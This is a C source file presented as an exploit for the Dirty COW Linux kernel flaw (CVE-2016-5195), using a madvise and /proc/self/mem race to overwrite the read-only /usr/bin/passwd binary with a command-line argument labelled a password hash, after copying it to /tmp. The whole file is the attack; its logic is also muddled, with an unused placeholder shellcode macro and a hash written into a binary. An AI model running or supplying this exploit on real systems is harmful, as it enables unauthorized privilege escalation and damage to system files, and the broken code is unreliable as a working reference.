// dirtyc0w.c - Exploit Dirty COW (CVE-2016-5195)
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#define TARGET_FILE "/usr/bin/passwd"
#define BACKUP_FILE "/tmp/passwd.bak"
#define SHELLCODE "\x7f\x45\x4c\x46" // Contoh shellcode placeholder

char *map;
int stop = 0;

void *madviseThread(void *arg) {
    while (!stop) {
        madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

void *procselfmemThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    while (!stop) {
        lseek(f, (off_t)map, SEEK_SET);
        write(f, arg, strlen(arg));
    }
    close(f);
    return NULL;
}

int main(int argc, char *argv[]) {
    struct stat st;
    pthread_t pth1, pth2;

    if (argc != 2) {
        printf("Usage: %s <new_password_hash>\n", argv[0]);
        return 1;
    }

    // Backup original passwd file
    system("cp /usr/bin/passwd /tmp/passwd.bak");

    int f = open(TARGET_FILE, O_RDONLY);
    fstat(f, &st);

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, argv[1]);

    sleep(5);
    stop = 1;

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("Exploit finished. Check %s\n", TARGET_FILE);
    return 0;
}
